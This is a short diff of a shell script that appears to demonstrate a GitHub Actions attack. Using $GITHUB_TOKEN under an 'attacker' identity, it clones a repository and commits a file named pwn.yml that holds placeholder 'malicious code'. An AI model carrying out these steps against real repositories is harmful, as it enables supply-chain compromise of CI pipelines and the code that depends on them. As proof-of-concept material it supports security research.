@@ -4,7 +4,7 @@ TOKEN=$GITHUB_TOKEN
 git config --global user.email "attacker@example.com"
 git config --global user.name "attacker"
 git clone https://github.com/shreyapohekar/my-dranet.git
-cd repo
+cd my-dranet
 echo 'malicious code' > .github/workflows/pwn.yml
 git add .github/workflows/pwn.yml
 git commit -m "Add malicious workflow"
